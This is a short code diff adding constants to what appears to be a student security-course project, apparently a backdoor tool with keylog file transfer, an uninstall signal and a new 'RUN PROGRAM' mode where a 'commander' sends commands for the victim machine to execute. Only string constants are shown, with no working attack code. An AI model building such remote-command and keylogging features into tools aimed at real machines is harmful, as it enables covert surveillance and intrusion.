@@ -152,3 +152,10 @@ TRANSFER_KEYLOG_FILE_INFO = "[+] TRANSFER FILE: Now transferring {}..."
 UNINSTALL = "UNINSTALL"
 PROJECT_NAME = "COMP_8505_project-main"
 PROJECT_NAME_ALT = "COMP_8505_project"
+
+# RUN PROGRAM
+RUN_PROGRAM_SIGNAL = "RUN PROGRAM"
+EXIT_RUN_PROGRAM_SIGNAL = "exit"
+COMMANDER_QUIT = "[+] RUN PROGRAM TERMINATED: Commander has stopped running program/commands..."
+COMMAND_WAIT_MSG = "[+] Now awaiting command from commander..."
+
